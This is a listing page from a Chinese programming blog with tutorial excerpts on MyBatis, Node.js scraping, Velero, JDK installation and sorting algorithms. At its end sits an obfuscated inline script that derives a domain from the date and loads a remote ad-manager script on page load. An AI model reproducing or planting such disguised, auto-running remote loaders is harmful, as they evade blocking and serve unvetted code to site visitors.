		1、简介 1.1、什么是Mybatis Mybatis是一款优秀的持久层框架他支持定制化SQL、存储过程以及高级映射Mybatis避免了几乎所有的JDBC代码和手动设置参数以及获取结果集。Mybatis可以使用简单的xml或者注解来配置和映射原生类型、接口和Java的POJO（Plain Old Java Objects,普通老式Java对象）为数据库中的记录。MyBatis本是apache的一个开源项目iBatis，2010年这个项目由apache software foundation迁移到了[google code](https://baike.baidu.com/item/google code/2346604?fromModule=lemma_inlink)，并且改名为MyBatis。2013年11月迁移到Github。 如何获得Mybatis: maven仓库: &lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.6&lt;/version&gt; &lt;/dependency&gt; Github: https://github.com/mybatis/mybatis-3中文文档: https://mybatis.org/mybatis-3/zh/getting-started.html 1.2、持久化 数据持久化
持久化就是将程序的数据在持久状态和瞬时状态转化的过程内存：断点即失数据库（JDBC），IO文件持久化生活： 冷藏。罐头。 为什么需要持久化？
有一些对象，不能让他丢失掉。内存太贵。 1.3、持久层 DAO层、Service层、Controller层。。。
完成持久化工作的代码块层界限十分明显 1.4 问什么需要Mybatis 帮组程序员将数据存入到数据库中
方便
传统的JDBC代码太复杂了。 讲话。框架。 自动化。
不用Mybatis也可以。 更容易上手。 技术没有高低之分
有点：
简单易学灵活：sql和代码的分离，提高了可维护性。提供映射标签，支持对象与数据库的ORM字段关系映射。提供对象关系映射标签，支持对象关系组建维护。提供xml标签，支持编写动态sql。 最重要的一点: 使用的人多;
2、第一个Mybatis程序 2.1 搭建环境 思路流程：搭建环境—&gt;导入Mybatis—-&gt;编写代码—-&gt;测试
a. 搭建数据库 CREATE DATABASE if not exist `mybatis` charset utf8; USE `mybatis`; DROP TABLE IF EXISTS `user`; CREATE TABLE `user` ( `id` int(20) NOT NULL, `name` varchar(30) DEFAULT NULL, `pwd` varchar(30) DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; insert into `user`(`id`,`name`,`pwd`) values (1,'狂神','123456'),(2,'张三','abcdef'),(3,'李四','987654'); b.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6c60d7854a9f92c74c68cabb1cd627b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5e4681071eff2c73810d6dbc6d40250/" rel="bookmark">
			简单介绍Node.js实现爬虫
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单介绍Node.js实现爬虫 Node.js是一种 JavaScript 运行环境，它实现了以 JavaScript 为控制语言的服务器端编程，可以用来编写实现爬虫功能的脚本。
爬虫的实现原理 爬虫是一种自动从网页上提取数据的工具，比如从网页上提取用户名、评论等数据。
爬虫的实现原理是使用Node.js发出http请求，然后解析html文档，根据指定的xpath规则或正则表达式从页面中提取所需的数据。
使用Node.js实现爬虫 要使用Node.js实现爬虫功能，首先需要安装Node.js环境，其次需要选择一个实现爬虫功能的模块，常用的有cheerio、request、superagent等。
使用cheerio cheerio是Node.js环境中实现爬虫的最常用工具，它是jQuery的一个server端实现，可以直接用jQuery的语法从页面中提取数据。
首先安装cheerio：
npm install cheerio 然后使用cheerio发出http请求，获取html文档，并使用jQuery语法提取所需的数据：
var cheerio = require('cheerio'); var request = require('request'); request('http://example.com', function (error, response, body) { if (!error &amp;&amp; response.statusCode == 200) { var $ = cheerio.load(body); var title = $('title').text(); // 获取title var comments = $('.comment').text(); // 获取评论 //... } }); 使用request request是Node.js环境中用来发出http请求的工具，可以直接使用正则表达式或xpath规则从html文档中提取数据。
首先安装request：
npm install request 然后使用request发出http请求，获取html文档，并使用正则表达式或xpath规则提取所需的数据：
var request = require('request'); request('http://example.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5e4681071eff2c73810d6dbc6d40250/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5740998d89191d2cd288d8a348cff268/" rel="bookmark">
			chrome浏览器禁止指定的http请求
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在debug时为了去除干扰项，可以在chrome浏览器中禁止指定的URL请求。
以下方法可以在浏览器中禁止发出该请求，方法如下：
1、打开浏览器，进入开发者工具（通常可以按F12打开）。
2、切换到“Network”（网络）选项卡，在该选项卡中可以查看浏览器发出的请求和响应信息。
在该选项卡中找到发出GET /favicon.ico请求的记录，并右键单击该记录，选择“Block request URL”（阻止请求URL）选项。
3、刷新页面，此时浏览器将不再发出该请求。
请注意，禁止发出/favicon.ico请求可能会影响网站的外观和用户体验，因为/favicon.ico通常是网站的图标文件。如果网站中确实需要/favicon.ico文件，请尽快解决上游服务器的问题并恢复该文件的正常访问。
示例:
下图中向服务器发出/favicon.ico文件已经禁止
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8ee0c4237f09d91b738cb0e2038ff41/" rel="bookmark">
			解决 ant design 组件显示英文的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这是因为你使用了组件库但是没有配置国际化导致的！
直接在根 index.js 中去进行引入
import zhCN from "antd/locale/zh_CN"; import { ConfigProvider } from "antd"; 然后去使用 ConfigProvider 包裹住 &lt;App / &gt; 组件进行配置
root.render( &lt;ConfigProvider locale={zhCN}&gt; &lt;App /&gt; &lt;/ConfigProvider&gt; ); 时小记，终有成。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/168e3d411b5c33a671f1defbf69f1b10/" rel="bookmark">
			K8s：通过Velero实现集群备份和恢复
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Velero 的简单介绍
Velero 是一个 vmware 开源的工具，用于 k8s 安全备份和恢复、执行灾难恢复以及迁移 Kubernetes 集群资源和持久卷。
在这里插入图片描述
Velero 可以做的：
备份集群并在丢失时恢复。
将集群资源迁移到其他集群。
将您的生产集群复制到开发和测试集群。
Velero 包括两部分：
在集群上运行的服务器(Velero 服务器)
在本地运行的命令行客户端(velero cli)
什么时候使用 Velero 代替 etcd 的内置备份/恢复是合适的？
关于 Velero 和 etcd 的快照备份如何选择？
我个人认为
etcd 快照备份适用于比较严重的集群灾难。比如所有 etcd 集群所有节点宕机，快照文件丢失损坏的情况。k8s 集群挂掉的情况， etcd 备份恢复 是一种快速且成功率高的恢复方式，Velero 的恢复需要依赖其他组件，并且需要保证集群是存活的。
Velero 适用于集群迁移，k8s 子集备份恢复，比如基于命名空间备份。某个命名空间误删，且 YAML 文件没有备份，那么可以 Velero 快速恢复。涉及多API资源对象 的系统升级，可以做升级前备份，升级失败通过 Velero 快速恢复。
Velero github 上面的解答：
Etcd 的备份/恢复工具非常适合从单个 etcd 集群中的数据丢失中恢复。例如，在升级 etcd istelf 之前备份 etcd 是个好主意。对于更复杂的 Kubernetes 集群备份和恢复管理，我们认为 Velero 通常是更好的方法。它使您能够扔掉不稳定的集群，并将您的 Kubernetes 资源和数据恢复到新的集群中，而仅通过备份和恢复 etcd 无法轻松做到这一点。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/168e3d411b5c33a671f1defbf69f1b10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53bca96ad95de400b02e985cb4e8d7c8/" rel="bookmark">
			druid&#43;mybatis 多数据源及读写分离的处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现如今复杂的业务系统，一般会将数据库按业务拆开，比如产品系统的数据库放在product db中，订单系统的数据库放在order db中...，然后，如果量大了，可能每个库还要考虑做读、写分离，以进一步提高系统性能，下面就来看看如何处理：
核心思路：配置多个数据源，然后利用RoutingDataSource结合AOP来动态切不同的库。
存在一下几个问题：
1、配置文件中，多数据源的配置节点如何设计？
#yml文件中进行如下配置 druid: type: com.alibaba.druid.pool.DruidDataSource study: master: #study库的主库名 url: jdbc:mysql://localhost:3306/study?useSSL=false&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;zeroDateTimeBehavior=convertToNull&amp;useUnicode=true driver-class-name: com.mysql.cj.jdbc.Driver username: root password: 1234 #加密很好 initial-size: 5 min-idle: 1 max-active: 20 test-on-borrow: true slave: #study库的从库名 url: jdbc:mysql://localhost:3306/study_slave?useSSL=false&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;zeroDateTimeBehavior=convertToNull&amp;useUnicode=true driver-class-name: com.mysql.cj.jdbc.Driver username: root password: A1b2c3@def.com initial-size: 5 min-idle: 1 max-active: 20 test-on-borrow: true product: master: #product库的主库名 url: jdbc:mysql://localhost:3306/product?useSSL=false&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;zeroDateTimeBehavior=convertToNull&amp;useUnicode=true driver-class-name: com.mysql.cj.jdbc.Driver username: root password: 1234 #加密 initial-size: 5 min-idle: 1 max-active: 20 test-on-borrow: true slave: #product库的从库 url: jdbc:mysql://localhost:3306/product_slave?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53bca96ad95de400b02e985cb4e8d7c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/599faa5b162a9e0791201d26d8fd69f2/" rel="bookmark">
			错误解决：These dependencies were not found: core-js/modules/es.array.push.js
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		错误描述
执行npm run dev后报错：
These dependencies were not found:
* core-js/modules/es.array.push.js in ./node_modules/@babel/runtime/helpers/objectSpread2.js, ./node_modules/cache-loader/dist/cjs.js??ref--12-0!./node_modules/@vue/cli-pluvue?vue&amp;type=script&amp;lang=js&amp; and 9 others
* core-js/modules/es.error.cause.js in ./node_modules/@babel/runtime/helpers/regeneratorRuntime.js, ./src/utils/request.js and 2 others
* core-js/modules/es.object.proto.js in ./node_modules/@babel/runtime/helpers/regeneratorRuntime.js
* core-js/modules/es.regexp.dot-all.js in ./node_modules/cache-loader/dist/cjs.js??ref--12-0!./node_modules/@vue/cli-plugin-babel/node_modules/babel-loader/lib!./node_moduland 1 other
To install them, you can run: npm install --save core-js/modules/es.array.push.js core-js/modules/es.error.cause.js core-js/modules/es.object.proto.js core-js/modules/es.re
解决方式
删除node_modules中的3个文件夹：
core-js
core-js-compat
core-util-js
之后，再执行
npm i core-js --save
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb8225c93c5a68881371e39c3bf9d2fb/" rel="bookmark">
			离线安装JDK环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、上传JDK环境,不多说自己下载：
wget --no-check-certificate --no-cookies --header "Cookie: oraclelicense=accept-securebackup-cookie" http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.tar.gz 2、创建文件夹
3、解压
mkdir /usr/local/java cd /usr/local/java/ 执行第一步上面得下载命令 tar -zxvf jdk-8u131-linux-x64.tar.gz 4、配置环境变量
vim /etc/profile 末尾增加下面得 JAVA_HOME=/usr/local/java/jdk1.8.0_131 JRE_HOME=/usr/local/java/jdk1.8.0_131/jre PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib export JAVA_HOME JRE_HOME PATH CLASSPATH 5、刷新配置文件
source /etc/profile 6、测试
javac java -version 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/112811e692786fc067d57feda1287fa9/" rel="bookmark">
			【leetcode学习笔记】堆排序、基数排序、排序算法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、堆排序 1.1 堆 堆：堆是一种特殊的完全二叉树，大根堆是指任意一个结点的值大于它的两个孩子的值；小根堆是指任意一个结点的值小于它的两个孩子的值。
因为数组可以唯一对应完全二叉树，因此我们可以在数组结构中实现堆的相关工作。比如：对于结点i，它的父结点为(i-1)//2，它的左子结点为2i+1，右子结点为2i+2。
1.2 堆排序的核心思想 第一步：将数组转化为大根堆
从一棵空树出发，一个一个点加入，每次加入一个点，都通过一定的操作，使其变成一个大根堆。具体操作为，每一次将新的点放到最后一个叶结点，然后和它的父结点做比较，如果它的值大于父结点的值，那么就交换两个值。然后继续循环，直至它的值小于父节点，或者变成头结点。这样，每次加入一个点以后，我们仍能保持树的大根堆结构。
第二步：将大根堆转化为升序序列
首先，将大根堆的根结点，和最后一个叶结点交换，那么最后一个点就有序了。然后再把剩下的结点构成的树还原成一个大根堆。然后再把根结点，和倒数第二个叶结点交换，这样后两个点就有序了，再把剩下的树还原成一个大根堆。如此重复下去，就可以将大根堆的元素一个个弹出，最后就得到了升序数组。
还原大根堆的方法：将根结点向下比较，如果不是大根堆，就和两个孩子的最大值交换，直至树变成大根堆。
二、不基于比较的排序 2.1 核心思想 利用数据的内部结构进行排序。
例：对公司员工的年龄排序，我们知道员工年龄必然介于1-200，因此我们只需要准备一个200维的数组，然后我们遍历所有员工，23岁就让数组的23号元素加1，遍历过一次之后，我们就得到了每个年龄的员工数量，那么我们就可以还原出一个有序的年龄数组。
2.2 局限性 这种排序方法强依赖于数据的内部结构，就上例而言，年龄构成的是一个“有序”的“有限”集，所以我们才能设计出O(n)的算法。如果我们的数据范围是[-2^-32, 2^32 - 1]的话，我们再设置一个计数数组，就不是很划算了。
2.3 基数排序 假设给若干个4位数，准备10个桶，根据所有数的千位放到对应的桶中，那么9xxx的桶中的数一定比8xxx的桶中的数大，我们就只需要在每个桶内，对所有数的百位再分桶，如此迭代下去即可。
基数排序之所以可以免于比较，是因为“数”本身是有“进制”这个概念的，如果我们想要比较的东西没有“进制”的概念，那就没法用基数排序了。
三、排序算法总结 3.1 排序算法的稳定性 两个相等的数，在经过排序后，是否仍能保持原先的次序。稳定性在基础类型数据中一般不起作用，因为2和2谁先谁后并无所谓。但是在特定场景下，就有意义了。比如说excel的排序功能，原表有“班级”和“年龄”两个列，如果对“年龄”排序，我们希望在“年龄”值相等时“班级”列仍能保持原先的顺序，那么只有具备稳定性的排序算法才有这样的能力。
选择：[2,2,1]，第一步1和第一个2交换，不稳定
插入：可以设置相等时插到右边，稳定
冒泡：可以设置相等时不交换，稳定
归并：归并时可以设置相等时，指针优先走左半边，稳定
堆排：每一个结点只能看到它的上下最多三个点，其余的点看不到，不稳定
快排：不稳定
3.2 O(nlog n)的算法比较 堆排序：额外空间复杂度O(1)
快速排序：速度快，O(nlog n)对应的常数较小
归并排序：稳定
因此一般情况下，我们都选用速度最快的快速排序。如果我们希望节省空间，那么就采用堆排序。如果对稳定性有要求，就选用归并排序。
基于比较的排序：
目前为止，没有算法能使得时间复杂度优于nlogn。目前为止，没有算法能使得时间复杂度O(nlogn)，空间复杂度O(1)，且稳定。 3.3 排序算法的常见坑 归并排序的空间复杂度能否变成O(1)？可以，有内部缓存法，但是不稳定，那为什么不直接用堆呢？原地归并排序能让归并排序的空间复杂度变成O(1)，但是会让时间复杂度变为O(n^2)，那为什么不直接用插入呢？快速排序能不能稳定？可以，有0-1 stable sort，但是空间变成O(n)，那为什么不直接用归并呢？面试题：一个整数数组，要求找到时间O(n)，空间O(1)的方法，使得数组变为奇数在左，偶数在右，且奇数的相对次序不变，偶数的相对次序不变？答案：不存在，如果存在，那么我们就能构建稳定的快速排序算法。因为把奇偶保持次序的分为两部分，等价于将小值和大值保持次序的分为两部分。 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/93/">«</a>
	<span class="pagination__item pagination__item--current">94/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/95/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>